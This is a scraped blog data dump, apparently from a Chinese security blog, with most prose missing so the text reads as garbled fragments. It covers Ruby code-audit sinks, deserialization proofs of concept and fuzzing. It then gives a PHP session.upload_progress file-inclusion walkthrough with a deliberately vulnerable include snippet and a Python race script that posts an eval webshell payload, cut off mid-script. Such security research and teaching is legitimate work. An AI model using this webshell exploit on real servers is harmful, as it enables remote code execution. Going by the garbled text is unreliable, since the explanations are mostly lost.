title=\"\"></a><strong></strong></h4><p>systemlinux</p>\n<ul>\n<li>``</li>\n<li>$</li>\n<li>;</li>\n<li>|</li>\n<li>&amp;</li>\n<li>\\n</li>\n</ul>\n<p></p>\n<ul>\n<li></li>\n<li></li>\n<li>syscall</li>\n<li></li>\n<li>exec</li>\n<li>3.*</li>\n</ul>\n<p>Ruby</p>\n<ul>\n<li>%x&#x2F;&#x2F;</li>\n<li>``</li>\n<li></li>\n<li>IO.read</li>\n<li>IO.write</li>\n<li>IO.binread</li>\n<li>IO.binwrite</li>\n<li>IO.foreach</li>\n<li>IO.readlines</li>\n</ul>\n<p>%x&#x2F;&#x2F;system</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252140851.jpeg\"\n                       \n                 >  </p>\n<p>openRuby</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252140284.jpeg\"\n                       \n                 >  </p>\n<p>openIO.read&#x2F;IO.write&#x2F;IO.binread&#x2F;IO.binwrite&#x2F;IO.foreach&#x2F;IO.readlines</p>\n<p>openRuby</p>\n<p>File.readRuby</p>\n<p>IO.readlinesRuby</p>\n<h4 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a><strong></strong></h4><p>evalRubyevalclass_evalinstance_evaleval</p>\n<p>Rubyevalclass_evalinstance_eval</p>\n<blockquote>\n<p></p>\n<p>__send__</p>\n<p>public_send</p>\n<p>const_get</p>\n<p>constantize</p>\n</blockquote>\n<h5 id=\"send\"><a href=\"#send\" class=\"headerlink\" title=\"send\"></a><strong>send</strong></h5><p>sendRubyJAVAinvoke</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252140660.jpeg\"\n                       \n                 ></p>\n<p>ksendhellohelloeval</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://image.3001.net/images/20220831/1661940404_630f32b435fb70310edaf.jpg!small\"\n                       \n                 ></p>\n<h5 id=\"send-\"><a href=\"#send-\" class=\"headerlink\" title=\"__send__\"></a><strong>__send__</strong></h5><p>__send__sendsend__send__</p>\n<h5 id=\"public-send\"><a href=\"#public-send\" class=\"headerlink\" title=\"public_send\"></a><strong>public_send</strong></h5><p>public_sendsendsend</p>\n<p>sendRuby</p>\n<p></p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252140078.jpeg\"\n                       \n                 ></p>\n<h5 id=\"const-get\"><a href=\"#const-get\" class=\"headerlink\" title=\"const_get\"></a><strong>const_get</strong></h5><p>const_getRubyinherittruetrueRubyJAVAforName</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252140717.jpeg\"\n                       \n                 ></p>\n<p>const_getRubyrack-proxy</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://image.3001.net/images/20220831/1661940439_630f32d7ba288888dc941.png!small\"\n                       \n                 ></p>\n<p>perform_requestNetHTTPHTTPfull_pathnewHTTPconst_getinheritGitHub</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://image.3001.net/images/20220831/1661940450_630f32e2be9715971cd92.png!small\"\n                       \n                 ></p>\n<p>gitlab</p>\n<p><a class=\"link\"   href=\"https://hackerone.com/reports/1125425%EF%BC%8C\" >https://hackerone.com/reports/1125425<i class=\"fas fa-external-link-alt\"></i></a> kramdownconst_getinheritvakzzRedis</p>\n<h5 id=\"constantize\"><a href=\"#constantize\" class=\"headerlink\" title=\"constantize\"></a><strong>constantize</strong></h5><p>constantizeRubyonRailsconst_get</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://image.3001.net/images/20220831/1661940748_630f340ccd8c997de601e.jpg!small\"\n                       \n                 ></p>\n<p>constantize</p>\n<h4 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a><strong></strong></h4><p>Ruby</p>\n<h5 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a><strong></strong></h5><p>MarshalRubyMarshal.dumpMarshal.load</p>\n<p>Marshal</p>\n<ul>\n<li>l<a class=\"link\"   href=\"https://github.com/httpvoid/writeups/blob/main/Ruby-deserialization-gadget-on-rails.md\" >https://github.com/httpvoid/writeups/blob/main/Ruby-deserialization-gadget-on-rails.md<i class=\"fas fa-external-link-alt\"></i></a></li>\n</ul>\n<p>POC</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252140260.jpeg\"\n                       \n                 ></p>\n<p>POCruby-3.0.0</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252140502.jpeg\"\n                       \n                 ></p>\n<p></p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252140540.jpeg\"\n                       \n                 ></p>\n<h5 id=\"JSON\"><a href=\"#JSON\" class=\"headerlink\" title=\"JSON\"></a><strong>JSON</strong></h5><p>Ruby JSONRubyJSONoj<a class=\"link\"   href=\"https://github.com/ohler55/oj%EF%BC%89%E3%80%82oj%E5%9C%A8%E8%A7%A3%E6%9E%90JSON%E6%97%B6%E6%94%AF%E6%8C%81%E5%A4%9A%E7%A7%8D%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%EF%BC%8C%E5%8C%85%E6%8B%AC%E4%BC%9A%E5%AF%BC%E8%87%B4%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E7%9A%84Object%E7%B1%BB%E5%9E%8B%E3%80%82\" >https://github.com/ohler55/ojojJSONObject<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p>POC</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252140543.jpeg\"\n                       \n                 ></p>\n<p>POCruby-3.0.0</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252140594.jpeg\"\n                        alt=\"image.php?url=YD_cnt_38_01EP10d8ODcL\"\n                 ></p>\n<p>oj</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://image.3001.net/images/20220831/1661940920_630f34b8b2b08d5d6e8df.jpg!small\"\n                       \n                 ></p>\n<h5 id=\"YAML\"><a href=\"#YAML\" class=\"headerlink\" title=\"YAML\"></a><strong>YAML</strong></h5><p>Ruby YAMLpysch 4.0YAML.loadpsych 4.0YAML.unsafe_loadPOC</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252140202.jpeg\"\n                       \n                 ></p>\n<p>POCruby-3.0.0</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252140722.jpeg\"\n                       \n                 >  </p>\n<p>Ruby YAMLpsych4.0save_loadpsych 4.0load<a class=\"link\"   href=\"https://github.com/ruby/psych/pull/487%EF%BC%89%E3%80%82\" >https://github.com/ruby/psych/pull/487<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p>unsafe_loadyaml</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://image.3001.net/images/20220831/1661941095_630f3567d7c3fc569c634.png!small\"\n                       \n                 >  </p>\n<h4 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a><strong></strong></h4><p>RubyRuby^$\\A\\Z</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252140170.jpeg\"\n                       \n                 >  </p>\n<p></p>\n<p></p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252140475.jpeg\"\n                       \n                 >  </p>\n<h4 id=\"FUZZ-Ruby\"><a href=\"#FUZZ-Ruby\" class=\"headerlink\" title=\"FUZZ Ruby\"></a><strong>FUZZ Ruby</strong></h4><p>RubyRubyCMarshalFUZZ</p>\n<p>FUZZAFLplusplusRuby</p>\n<blockquote>\n<p>.&#x2F;configure CC&#x3D;&#x2F;opt&#x2F;AFLplusplus&#x2F;afl-clang-fast CXX&#x3D;&#x2F;opt&#x2F;AFLplusplus&#x2F;afl-clang-fast++ disable-install-doc disable-install-rdoc prefix&#x3D;&#x2F;usr&#x2F;local&#x2F;ruby enable-debug-env</p>\n<p>ASAN_OPTIONS&#x3D;detect_leaks&#x3D;0abort_on_error&#x3D;1allow_user_segv_handler&#x3D;0handle_abort&#x3D;1&#x3D;0</p>\n<p>AFL_USE_ASAN&#x3D;1</p>\n</blockquote>\n<p>AFLplusplusdeferred instrumentationRubymain.c</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252140931.jpeg\"\n                       \n                 ></p>\n<p>RubyRuby hookhookrubygems.rbMarshal</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252140175.jpeg\"\n                       \n                 >  </p>\n<p>FUZZ</p>\n<p>FUZZ</p>\n<p>1. CVE-2022-28738 onig_reg_resize</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://image.3001.net/images/20220831/1661941250_630f3602a476e3837ab11.png!small\"\n                       \n                 >  </p>\n<p>2. CVE-2022-28739 strtod </p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252140900.jpeg\"\n                       \n                 >  </p>\n<p>3. calc_tm_yday</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252140228.jpeg\"\n                       \n                 >  </p>\n<p>4. renumber_by_map</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252140778.jpeg\"\n                       \n                 >  </p>\n<p>5. JSON.parse </p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://image.3001.net/images/20220831/1661941308_630f363c5c3755eb6479d.png!small\"\n                       \n                 >  </p>\n<p>FUZZFUZZ</p>\n<p>ruby</p>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a><strong></strong></h3><blockquote>\n<p><a class=\"link\"   href=\"https://hackerone.com/ruby/hacktivity\" >https://hackerone.com/ruby/hacktivity<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p><a class=\"link\"   href=\"https://bishopfox.com/blog/ruby-vulnerabilities-exploits\" >https://bishopfox.com/blog/ruby-vulnerabilities-exploits<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p><a class=\"link\"   href=\"https://zenn.dev/ooooooo/_q/books/rails/_deserialize\" >https://zenn.dev/ooooooo\\_q/books/rails\\_deserialize<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p><a class=\"link\"   href=\"http://gavinmiller.io/2016/the-safesty-way-to-constantize/\" >http://gavinmiller.io/2016/the-safesty-way-to-constantize/<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p><a class=\"link\"   href=\"https://github.com/haileys/old-website/blob/master/posts/rails-3.2.10-remote-code-execution.md\" >https://github.com/haileys/old-website/blob/master/posts/rails-3.2.10-remote-code-execution.md<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p><a class=\"link\"   href=\"https://www.elttam.com/blog/ruby-deserialization/\" >https://www.elttam.com/blog/ruby-deserialization/<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p><a class=\"link\"   href=\"https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html\" >https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p><a class=\"link\"   href=\"https://bsidessf2018.sched.com/event/E6jC/fuzzing-ruby-and-c-extensions\" >https://bsidessf2018.sched.com/event/E6jC/fuzzing-ruby-and-c-extensions<i class=\"fas fa-external-link-alt\"></i></a></p>\n</blockquote>\n","site":{"data":{"keep":{"base_info":{"primary_color":"#0066cc","title":"P1taya","author":"P1taya","avatar":"/images/p1taya.jpg","logo":"/images/p1taya.jpg","favicon":"/images/p1taya.jpg"},"menu":{"home":"/ || fa-solid fa-home","archives":"/archives || fa-solid fa-box-archive","categories":"/categories || fa-solid fa-layer-group","links":"/links || fa-solid fa-link","about":"/about || fa-solid fa-user-graduate","photos":"/photos || fa-solid fa-image"},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":" || ","hitokoto":false},"home":{"announcement":null,"category":true,"tag":true,"post_datetime":"created || fa-solid fa-home","post_datetime_format":"YYYY-MM-DD HH:mm:ss"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":true,"share":false,"reward":{"enable":false,"img_link":null,"text":null}},"code_block":{"tools":{"enable":true,"style":"mac"},"highlight_theme":"obsidian"},"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":true,"site_pv":true,"page_pv":true}},"local_search":{"enable":true,"preload":false},"lazyload":{"enable":true},"footer":{"since":2022,"word_count":true},"inject":{"enable":true,"css":["/css/demo1.css"],"js":[null]},"cdn":{"enable":true,"provider":"jsdelivr"}},"links":[{"name":"dog","link":"https://wuster.store/","avatar":"https://wuster.store/images/favicon.ico"},{"name":"","link":"https://fushuling.com/","avatar":"https://fushuling-1309926051.cos.ap-shanghai.myqcloud.com/avatar.jpg"}]}},"more":"<h2 id=\"Ruby\"><a href=\"#Ruby\" class=\"headerlink\" title=\"Ruby\"></a>Ruby</h2><p>RubyRubyRubyRubyRubyRuby</p>\n<h2 id=\"Ruby\"><a href=\"#Ruby\" class=\"headerlink\" title=\"Ruby\"></a>Ruby</h2><p>Ruby2090MatzRuby</p>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a><strong></strong></h2><p>RubyRubyonRailsRubyRubywebSQLXSSSSRFRuby</p>\n<h4 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a><strong></strong></h4><p>systemlinux</p>\n<ul>\n<li>``</li>\n<li>$</li>\n<li>;</li>\n<li>|</li>\n<li>&amp;</li>\n<li>\\n</li>\n</ul>\n<p></p>\n<ul>\n<li></li>\n<li></li>\n<li>syscall</li>\n<li></li>\n<li>exec</li>\n<li>3.*</li>\n</ul>\n<p>Ruby</p>\n<ul>\n<li>%x&#x2F;&#x2F;</li>\n<li>``</li>\n<li></li>\n<li>IO.read</li>\n<li>IO.write</li>\n<li>IO.binread</li>\n<li>IO.binwrite</li>\n<li>IO.foreach</li>\n<li>IO.readlines</li>\n</ul>\n<p>%x&#x2F;&#x2F;system</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252140851.jpeg\"\n                       \n                 >  </p>\n<p>openRuby</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252140284.jpeg\"\n                       \n                 >  </p>\n<p>openIO.read&#x2F;IO.write&#x2F;IO.binread&#x2F;IO.binwrite&#x2F;IO.foreach&#x2F;IO.readlines</p>\n<p>openRuby</p>\n<p>File.readRuby</p>\n<p>IO.readlinesRuby</p>\n<h4 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a><strong></strong></h4><p>evalRubyevalclass_evalinstance_evaleval</p>\n<p>Rubyevalclass_evalinstance_eval</p>\n<blockquote>\n<p></p>\n<p>__send__</p>\n<p>public_send</p>\n<p>const_get</p>\n<p>constantize</p>\n</blockquote>\n<h5 id=\"send\"><a href=\"#send\" class=\"headerlink\" title=\"send\"></a><strong>send</strong></h5><p>sendRubyJAVAinvoke</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252140660.jpeg\"\n                       \n                 ></p>\n<p>ksendhellohelloeval</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://image.3001.net/images/20220831/1661940404_630f32b435fb70310edaf.jpg!small\"\n                       \n                 ></p>\n<h5 id=\"send-\"><a href=\"#send-\" class=\"headerlink\" title=\"__send__\"></a><strong>__send__</strong></h5><p>__send__sendsend__send__</p>\n<h5 id=\"public-send\"><a href=\"#public-send\" class=\"headerlink\" title=\"public_send\"></a><strong>public_send</strong></h5><p>public_sendsendsend</p>\n<p>sendRuby</p>\n<p></p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252140078.jpeg\"\n                       \n                 ></p>\n<h5 id=\"const-get\"><a href=\"#const-get\" class=\"headerlink\" title=\"const_get\"></a><strong>const_get</strong></h5><p>const_getRubyinherittruetrueRubyJAVAforName</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252140717.jpeg\"\n                       \n                 ></p>\n<p>const_getRubyrack-proxy</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://image.3001.net/images/20220831/1661940439_630f32d7ba288888dc941.png!small\"\n                       \n                 ></p>\n<p>perform_requestNetHTTPHTTPfull_pathnewHTTPconst_getinheritGitHub</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://image.3001.net/images/20220831/1661940450_630f32e2be9715971cd92.png!small\"\n                       \n                 ></p>\n<p>gitlab</p>\n<p><a class=\"link\"   href=\"https://hackerone.com/reports/1125425%EF%BC%8C\" >https://hackerone.com/reports/1125425<i class=\"fas fa-external-link-alt\"></i></a> kramdownconst_getinheritvakzzRedis</p>\n<h5 id=\"constantize\"><a href=\"#constantize\" class=\"headerlink\" title=\"constantize\"></a><strong>constantize</strong></h5><p>constantizeRubyonRailsconst_get</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://image.3001.net/images/20220831/1661940748_630f340ccd8c997de601e.jpg!small\"\n                       \n                 ></p>\n<p>constantize</p>\n<h4 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a><strong></strong></h4><p>Ruby</p>\n<h5 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a><strong></strong></h5><p>MarshalRubyMarshal.dumpMarshal.load</p>\n<p>Marshal</p>\n<ul>\n<li>l<a class=\"link\"   href=\"https://github.com/httpvoid/writeups/blob/main/Ruby-deserialization-gadget-on-rails.md\" >https://github.com/httpvoid/writeups/blob/main/Ruby-deserialization-gadget-on-rails.md<i class=\"fas fa-external-link-alt\"></i></a></li>\n</ul>\n<p>POC</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252140260.jpeg\"\n                       \n                 ></p>\n<p>POCruby-3.0.0</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252140502.jpeg\"\n                       \n                 ></p>\n<p></p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252140540.jpeg\"\n                       \n                 ></p>\n<h5 id=\"JSON\"><a href=\"#JSON\" class=\"headerlink\" title=\"JSON\"></a><strong>JSON</strong></h5><p>Ruby JSONRubyJSONoj<a class=\"link\"   href=\"https://github.com/ohler55/oj%EF%BC%89%E3%80%82oj%E5%9C%A8%E8%A7%A3%E6%9E%90JSON%E6%97%B6%E6%94%AF%E6%8C%81%E5%A4%9A%E7%A7%8D%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%EF%BC%8C%E5%8C%85%E6%8B%AC%E4%BC%9A%E5%AF%BC%E8%87%B4%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E7%9A%84Object%E7%B1%BB%E5%9E%8B%E3%80%82\" >https://github.com/ohler55/ojojJSONObject<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p>POC</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252140543.jpeg\"\n                       \n                 ></p>\n<p>POCruby-3.0.0</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252140594.jpeg\"\n                        alt=\"image.php?url=YD_cnt_38_01EP10d8ODcL\"\n                 ></p>\n<p>oj</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://image.3001.net/images/20220831/1661940920_630f34b8b2b08d5d6e8df.jpg!small\"\n                       \n                 ></p>\n<h5 id=\"YAML\"><a href=\"#YAML\" class=\"headerlink\" title=\"YAML\"></a><strong>YAML</strong></h5><p>Ruby YAMLpysch 4.0YAML.loadpsych 4.0YAML.unsafe_loadPOC</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252140202.jpeg\"\n                       \n                 ></p>\n<p>POCruby-3.0.0</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252140722.jpeg\"\n                       \n                 >  </p>\n<p>Ruby YAMLpsych4.0save_loadpsych 4.0load<a class=\"link\"   href=\"https://github.com/ruby/psych/pull/487%EF%BC%89%E3%80%82\" >https://github.com/ruby/psych/pull/487<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p>unsafe_loadyaml</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://image.3001.net/images/20220831/1661941095_630f3567d7c3fc569c634.png!small\"\n                       \n                 >  </p>\n<h4 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a><strong></strong></h4><p>RubyRuby^$\\A\\Z</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252140170.jpeg\"\n                       \n                 >  </p>\n<p></p>\n<p></p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252140475.jpeg\"\n                       \n                 >  </p>\n<h4 id=\"FUZZ-Ruby\"><a href=\"#FUZZ-Ruby\" class=\"headerlink\" title=\"FUZZ Ruby\"></a><strong>FUZZ Ruby</strong></h4><p>RubyRubyCMarshalFUZZ</p>\n<p>FUZZAFLplusplusRuby</p>\n<blockquote>\n<p>.&#x2F;configure CC&#x3D;&#x2F;opt&#x2F;AFLplusplus&#x2F;afl-clang-fast CXX&#x3D;&#x2F;opt&#x2F;AFLplusplus&#x2F;afl-clang-fast++ disable-install-doc disable-install-rdoc prefix&#x3D;&#x2F;usr&#x2F;local&#x2F;ruby enable-debug-env</p>\n<p>ASAN_OPTIONS&#x3D;detect_leaks&#x3D;0abort_on_error&#x3D;1allow_user_segv_handler&#x3D;0handle_abort&#x3D;1&#x3D;0</p>\n<p>AFL_USE_ASAN&#x3D;1</p>\n</blockquote>\n<p>AFLplusplusdeferred instrumentationRubymain.c</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252140931.jpeg\"\n                       \n                 ></p>\n<p>RubyRuby hookhookrubygems.rbMarshal</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252140175.jpeg\"\n                       \n                 >  </p>\n<p>FUZZ</p>\n<p>FUZZ</p>\n<p>1. CVE-2022-28738 onig_reg_resize</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://image.3001.net/images/20220831/1661941250_630f3602a476e3837ab11.png!small\"\n                       \n                 >  </p>\n<p>2. CVE-2022-28739 strtod </p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252140900.jpeg\"\n                       \n                 >  </p>\n<p>3. calc_tm_yday</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252140228.jpeg\"\n                       \n                 >  </p>\n<p>4. renumber_by_map</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252140778.jpeg\"\n                       \n                 >  </p>\n<p>5. JSON.parse </p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://image.3001.net/images/20220831/1661941308_630f363c5c3755eb6479d.png!small\"\n                       \n                 >  </p>\n<p>FUZZFUZZ</p>\n<p>ruby</p>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a><strong></strong></h3><blockquote>\n<p><a class=\"link\"   href=\"https://hackerone.com/ruby/hacktivity\" >https://hackerone.com/ruby/hacktivity<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p><a class=\"link\"   href=\"https://bishopfox.com/blog/ruby-vulnerabilities-exploits\" >https://bishopfox.com/blog/ruby-vulnerabilities-exploits<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p><a class=\"link\"   href=\"https://zenn.dev/ooooooo/_q/books/rails/_deserialize\" >https://zenn.dev/ooooooo\\_q/books/rails\\_deserialize<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p><a class=\"link\"   href=\"http://gavinmiller.io/2016/the-safesty-way-to-constantize/\" >http://gavinmiller.io/2016/the-safesty-way-to-constantize/<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p><a class=\"link\"   href=\"https://github.com/haileys/old-website/blob/master/posts/rails-3.2.10-remote-code-execution.md\" >https://github.com/haileys/old-website/blob/master/posts/rails-3.2.10-remote-code-execution.md<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p><a class=\"link\"   href=\"https://www.elttam.com/blog/ruby-deserialization/\" >https://www.elttam.com/blog/ruby-deserialization/<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p><a class=\"link\"   href=\"https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html\" >https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p><a class=\"link\"   href=\"https://bsidessf2018.sched.com/event/E6jC/fuzzing-ruby-and-c-extensions\" >https://bsidessf2018.sched.com/event/E6jC/fuzzing-ruby-and-c-extensions<i class=\"fas fa-external-link-alt\"></i></a></p>\n</blockquote>\n"},{"title":"session","date":"2023-02-13T15:31:54.000Z","excerpt":"session","_content":"\n## \n\n**PHP`session.upload_progress`session**\n\n## phpsession.upload\\_progress\n\nphp5.4\n\nphp.ini\n\n```auto\n1. session.upload_progress.enabled = on2. session.upload_progress.cleanup = on3. session.upload_progress.prefix = \"upload_progress_\"4. session.upload_progress.name = \"PHP_SESSION_UPLOAD_PROGRESS\"5. session.upload_progress.freq = \"1%\"6. session.upload_progress.min_freq = \"1\"\n```\n\n\n\n> `enabled=on``upload_progress`php()session \n>\n> `cleanup=on`phpsession\n>\n> `name`php\n>\n> `prefix+name`session\n\n## sessionsession\n\n\n\n> [https://www.cnblogs.com/iamstudy/articles/php\\_serialize\\_problem.html](https://www.cnblogs.com/iamstudy/articles/php_serialize_problem.html)\n>\n> [https://blog.spoock.com/2016/10/16/php-serialize-problem/?utm\\_source=tuicool&utm\\_medium=referral](https://blog.spoock.com/2016/10/16/php-serialize-problem/?utm_source=tuicool&utm_medium=referral)\n\nsession\n\n`session.use_strict_mode=off`offCookiesessionid\n\n## session.upload\\_progress\n\n### \n\n> php5.5.38\n>\n> win10\n>\n> session\n\n### \n\n```auto\n<?php$b=$_GET['file'];include \"$b\";?>\n```\n\n`session.upload_progress`sessionsessionsession\n\n### \n\n****\n\n`session_start()`,session\n\n****\n\n`session.auto_start=On` PHPSessionsession\\_start()\n\nsessionsession.use\\_strict\\_mode0Session IDCookiePHPSESSID=TGAOPHP/tmp/sess\\_TGAOSessionPHPSession ini.get(\"session.upload\\_progress.prefix\")+session.upload\\_progress.namesess\\_\n\n****\n\n`session.upload_progress.cleanup = on`session\n\n**rce**\n\n****\n\nsession\n\n### \n\n```auto\n#coding=utf-8import ioimport requestsimport threadingsessid = 'TGAO'data = {\"cmd\":\"system('whoami');\"}def write(session):    while True:        f = io.BytesIO(b'a' * 1024 * 50)        resp = session.post( 'http://127.0.0.1:5555/test56.php', data={'PHP_SESSION_UPLOAD_PROGRESS': '<?php eval($_POST[\"cmd\"]);?>'}, files={'file': ('tgao.txt',f)}, 